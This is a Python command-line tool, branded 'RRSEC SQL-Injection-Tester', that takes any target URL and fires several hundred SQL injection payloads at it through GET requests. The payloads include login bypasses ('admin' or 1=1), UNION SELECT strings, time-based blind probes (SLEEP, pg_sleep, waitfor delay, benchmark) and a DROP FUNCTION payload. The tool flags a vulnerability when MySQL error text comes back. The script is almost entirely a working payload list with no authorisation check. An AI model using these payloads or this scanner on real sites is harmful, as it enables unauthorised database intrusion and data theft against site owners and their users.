import requests
from colorama import Fore

def __start__():
    try:
        print(Fore.RED + " [!] Enter Target URL\n")
        target_url = input(Fore.RED + " ┌─[" + Fore.LIGHTGREEN_EX + "RRSEC" + Fore.BLUE + "~" + Fore.WHITE + "@ROOT" + Fore.RED + "/" + Fore.CYAN + "RR" + Fore.RED + "/" + Fore.LIGHTYELLOW_EX + "SQL-Injection-Tester" + Fore.RED + """]\n └──╼ """ + Fore.WHITE + "# ")
        main(target_url)
    except KeyboardInterrupt:
        print("\nExiting...")

def test_sql_injection(url):
    sql_payloads = [
        "' OR '1'='1",
        "' OR '1'='1' -- ",
        "' OR 1=1 -- ",
        '" OR "1"="1',
        '" OR "1"="1" -- ',
        "' or 1=1",
        "' or 1=1 limit 1 -- -+",
        "'",
        "''",
        "`",
        "``",
        ",",
        "\"",
        "\"\"",
        "/",
        "//",
        "\\",
        "\\\\",
        ";",
        "' or \"",
        "-- or #",
        "' OR '1",
        "' OR 1 -- -",
        "\" OR \"\" = \"",
        "\" OR 1 = 1 -- -",
        "' OR '' = '",
        "'='",
        "'LIKE'",
        "'=0--+",
        " OR 1=1",
        "' OR 'x'='x",
        "' AND id IS NULL; --",
        "'''''''''''''UNION SELECT '2",
        "%00",
        "/*…*/",
        "+",
        "||",
        "%",
        "@variable",
        "@@variable",
        "# Numeric",
        "AND 1",
        "AND 0",
        "AND true",
        "AND false",
        "1-false",
        "1-true",
        "1*56",
        "-2",
        "OR 3409=3409 AND ('pytW' LIKE 'pytW",
        "OR 3409=3409 AND ('pytW' LIKE 'pytY",
        "HAVING 1=1",
        "HAVING 1=0",
        "HAVING 1=1#",
        "HAVING 1=0#",
        "HAVING 1=1--",
        "HAVING 1=0--",
        "AND 1=1",
        "AND 1=0",
        "AND 1=1--",
        "AND 1=0--",
        "AND 1=1#",
        "AND 1=0#",
        "AND 1=1 AND '%'='",
        "AND 1=0 AND '%'='",
        "AND 1083=1083 AND (1427=1427",
        "AND 7506=9091 AND (5913=5913",
        "AND 1083=1083 AND ('1427=1427",
        "AND 7506=9091 AND ('5913=5913",
        "AND 7300=7300 AND 'pKlZ'='pKlZ",
        "AND 7300=7300 AND 'pKlZ'='pKlY",
        "AND 7300=7300 AND ('pKlZ'='pKlZ",
        "AND 7300=7300 AND ('pKlZ'='pKlY",
        "AS INJECTX WHERE 1=1 AND 1=1",
        "AS INJECTX WHERE 1=1 AND 1=0",
        "AS INJECTX WHERE 1=1 AND 1=1#",
        "AS INJECTX WHERE 1=1 AND 1=0#",
        "AS INJECTX WHERE 1=1 AND 1=1--",
        "AS INJECTX WHERE 1=1 AND 1=0--",
        "WHERE 1=1 AND 1=1",
        "WHERE 1=1 AND 1=0",
        "WHERE 1=1 AND 1=1#",
        "WHERE 1=1 AND 1=0#",
        "WHERE 1=1 AND 1=1--",
        "WHERE 1=1 AND 1=0--",
        "ORDER BY 1--",
        "ORDER BY 2--",
        "ORDER BY 3--",
        "ORDER BY 4--",
        "ORDER BY 5--",
        "ORDER BY 6--",
        "ORDER BY 7--",
        "ORDER BY 8--",
        "ORDER BY 9--",
        "ORDER BY 10--",
        "ORDER BY 11--",
        "ORDER BY 12--",
        "ORDER BY 13--",
        "ORDER BY 14--",
        "ORDER BY 15--",
        "ORDER BY 16--",
        "ORDER BY 17--",
        "ORDER BY 18--",
        "ORDER BY 19--",
        "ORDER BY 20--",
        "ORDER BY 21--",
        "ORDER BY 22--",
        "ORDER BY 23--",
        "ORDER BY 24--",
        "ORDER BY 25--",
        "ORDER BY 26--",
        "ORDER BY 27--",
        "ORDER BY 28--",
        "ORDER BY 29--",
        "ORDER BY 30--",
        "ORDER BY 31337--",
        "ORDER BY 1#",
        "ORDER BY 2#",
        "ORDER BY 3#",
        "ORDER BY 4#",
        "ORDER BY 5#",
        "ORDER BY 6#",
        "ORDER BY 7#",
        "ORDER BY 8#",
        "ORDER BY 9#",
        "ORDER BY 10#",
        "ORDER BY 11#",
        "ORDER BY 12#",
        "ORDER BY 13#",
        "ORDER BY 14#",
        "ORDER BY 15#",
        "ORDER BY 16#",
        "ORDER BY 17#",
        "ORDER BY 18#",
        "ORDER BY 19#",
        "ORDER BY 20#",
        "ORDER BY 21#",
        "ORDER BY 22#",
        "ORDER BY 23#",
        "ORDER BY 24#",
        "ORDER BY 25#",
        "ORDER BY 26#",
        "ORDER BY 27#",
        "ORDER BY 28#",
        "ORDER BY 29#",
        "ORDER BY 30#",
        "ORDER BY 31337#",
        "ORDER BY 1",
        "ORDER BY 2",
        "ORDER BY 3",
        "ORDER BY 4",
        "ORDER BY 5",
        "ORDER BY 6",
        "ORDER BY 7",
        "ORDER BY 8",
        "ORDER BY 9",
        "ORDER BY 10",
        "ORDER BY 11",
        "ORDER BY 12",
        "ORDER BY 13",
        "ORDER BY 14",
        "ORDER BY 15",
        "ORDER BY 16",
        "ORDER BY 17",
        "ORDER BY 18",
        "ORDER BY 19",
        "ORDER BY 20",
        "ORDER BY 21",
        "ORDER BY 22",
        "ORDER BY 23",
        "ORDER BY 24",
        "ORDER BY 25",
        "ORDER BY 26",
        "ORDER BY 27",
        "ORDER BY 28",
        "ORDER BY 29",
        "ORDER BY 30",
        "ORDER BY 31337",
        "RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='",
        "RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='",
        "IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--",
        "IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--",
        "%' AND 8310=8310 AND '%'='",
        "%' AND 8310=8311 AND '%'='",
        "and (select substring(@@version,1,1))='X'",
        "and (select substring(@@version,1,1))='M'",
        "and (select substring(@@version,2,1))='i'",
        "and (select substring(@@version,2,1))='y'",
        "and (select substring(@@version,3,1))='c'",
        "and (select substring(@@version,3,1))='S'",
        "and (select substring(@@version,3,1))='X'",
        "# from wapiti",
        "sleep(5)#",
        "1 or sleep(5)#",
        "\" or sleep(5)#",
        "' or sleep(5)#",
        "\" or sleep(5)=\"",
        "' or sleep(5)='",
        "1) or sleep(5)#",
        "\") or sleep(5)=\"",
        "') or sleep(5)='",
        "1)) or sleep(5)#",
        "\")) or sleep(5)=\"",
        "')) or sleep(5)='",
        ";waitfor delay '0:0:5'--",
        ");waitfor delay '0:0:5'--",
        "';waitfor delay '0:0:5'--",
        "\";waitfor delay '0:0:5'--",
        "');waitfor delay '0:0:5'--",
        "\"');waitfor delay '0:0:5'--",
        "benchmark(10000000,MD5(1))#",
        "1 or benchmark(10000000,MD5(1))#",
        "\" or benchmark(10000000,MD5(1))#",
        "' or benchmark(10000000,MD5(1))#",
        "1) or benchmark(10000000,MD5(1))#",
        "\") or benchmark(10000000,MD5(1))#",
        "') or benchmark(10000000,MD5(1))#",
        "1)) or benchmark(10000000,MD5(1))#",
        "\")) or benchmark(10000000,MD5(1))#",
        "')) or benchmark(10000000,MD5(1))#",
        "pg_sleep(5)--",
        "1 or pg_sleep(5)--",
        "\" or pg_sleep(5)--",
        "' or pg_sleep(5)--",
        "1) or pg_sleep(5)--",
        "\") or pg_sleep(5)--",
        "') or pg_sleep(5)--",
        "1)) or pg_sleep(5)--",
        "\")) or pg_sleep(5)--",
        "')) or pg_sleep(5)--",
        "AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe",
        "AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='",
        "AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)",
        "AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--",
        "AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#",
        "SLEEP(5)#",
        "SLEEP(5)--",
        "SLEEP(5)=\"",
        "SLEEP(5)='",
        "or SLEEP(5)",
        "or SLEEP(5)#",
        "or SLEEP(5)--",
        "or SLEEP(5)=\"",
        "or SLEEP(5)='",
        "waitfor delay '00:00:05'",
        "waitfor delay '00:00:05'--",
        "waitfor delay '00:00:05'#",
        "benchmark(50000000,MD5(1))",
        "benchmark(50000000,MD5(1))--",
        "benchmark(50000000,MD5(1))#",
        "or benchmark(50000000,MD5(1))",
        "or benchmark(50000000,MD5(1))--",
        "or benchmark(50000000,MD5(1))#",
        "pg_SLEEP(5)",
        "pg_SLEEP(5)--",
        "pg_SLEEP(5)#",
        "or pg_SLEEP(5)",
        "or pg_SLEEP(5)--",
        "or pg_SLEEP(5)#",
        "'\\\"",
        "AnD SLEEP(5)",
        "AnD SLEEP(5)--",
        "AnD SLEEP(5)#",
        "&&SLEEP(5)",
        "&&SLEEP(5)--",
        "&&SLEEP(5)#",
        "' AnD SLEEP(5) ANd '1",
        "'&&SLEEP(5)&&'1",
        "ORDER BY SLEEP(5)",
        "ORDER BY SLEEP(5)--",
        "ORDER BY SLEEP(5)#",
        "(SELECT * FROM (SELECT(SLEEP(5)))ecMj)",
        "(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#",
        "(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--",
        "+benchmark(3200,SHA1(1))+",
        "+ SLEEP(10) +",
        "RANDOMBLOB(500000000/2)",
        "AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))",
        "OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))",
        "RANDOMBLOB(1000000000/2)",
        "AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",
        "OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",
        "SLEEP(1)/*' or SLEEP(1) or '\" or SLEEP(1) or \"*/",
        "'-'",
        "' '",
        "'&'",
        "'^'",
        "'*'",
        "' or ''-'",
        "' or '' '",
        "' or ''&'",
        "' or ''^'",
        "' or ''*'",
        "\"-\"",
        "\" \"",
        "\"&\"",
        "\"^\"",
        "\"*\"",
        "\" or \"\"-\"",
        "\" or \"\" \"",
        "\" or \"\"&\"",
        "\" or \"\"^\"",
        "\" or \"\"*\"",
        "\"or true--",
        "\" or true--",
        "' or true--",
        "\") or true--",
        "') or true--",
        "' or 'x'='x",
        "') or ('x')=('x",
        "')) or (('x'))=(('x",
        "\" or \"x\"=\"x",
        "\") or (\"x\")=(\"x",
        "\")) or ((\"x\"))=((\"x",
        "\"or 1=1",
        "\"or 1=1--",
        "\"or 1=1#",
        "\"or 1=1/*",
        "\"admin' --",
        "\"admin' #",
        "\"admin'/*",
        "\"admin' or '1'='1",
        "\"admin' or '1'='1'--",
        "\"admin' or '1'='1'#",
        "\"admin' or '1'='1'/*",
        "\"admin'or 1=1 or ''='",
        "\"admin' or 1=1",
        "\"admin' or 1=1--",
        "\"admin' or 1=1#",
        "\"admin' or 1=1/*",
        "\"admin') or ('1'='1",
        "\"admin') or ('1'='1'--",
        "\"admin') or ('1'='1'#",
        "\"admin') or ('1'='1'/*",
        "\"1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",
        "\"admin\" --",
        "\"admin\" #",
        "\"admin\"/*",
        "\"admin\" or \"1\"=\"1",
        "\"admin\" or \"1\"=\"1\"--",
        "\"admin\" or \"1\"=\"1\"#",
        "\"admin\" or \"1\"=\"1\"/*",
        "\"admin\"or 1=1 or \"\"=\"",
        "\"admin\" or 1=1",
        "\"admin\" or 1=1--",
        "\"admin\" or 1=1#",
        "\"admin\" or 1=1/*",
        "\"admin\") or (\"1\"=\"1",
        "\"admin\") or (\"1\"=\"1\"--",
        "\"vadmin\") or (\"1\"=\"1\"#",
        "\"admin\") or (\"1\"=\"1\"/*",
        "\"admin\") or \"1\"=\"1",
        "\"admin\") or \"1\"=\"1\"--",
        "\"admin\") or \"1\"=\"1\"#",
        "\"admin\") or \"1\"=\"1\"/*",
        "\"1234 \"AND 1=0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055"
    ]

    for payload in sql_payloads:
        target_url = url + payload
        print(f"Testing: {target_url}")
        
        try:
            response = requests.get(target_url)
            if "SQL syntax" in response.text or "mysql_fetch" in response.text or "MySQL" in response.text:
                print(f"Possible SQL Injection vulnerability found with payload: {payload}")
                return True
        except requests.RequestException as e:
            print(f"An error occurred: {e}")
            return False

    print("No SQL Injection vulnerability found.")
    return False

def main(target_url):
    if not target_url:
        print("Please provide a valid URL.")
        return
    
    if not target_url.startswith("http://") and not target_url.startswith("https://"):
        target_url = "http://" + target_url

    if test_sql_injection(target_url):
        print(Fore.RED + "Vulnerability detected!")
    else:
        print(Fore.GREEN + "No vulnerabilities detected.")
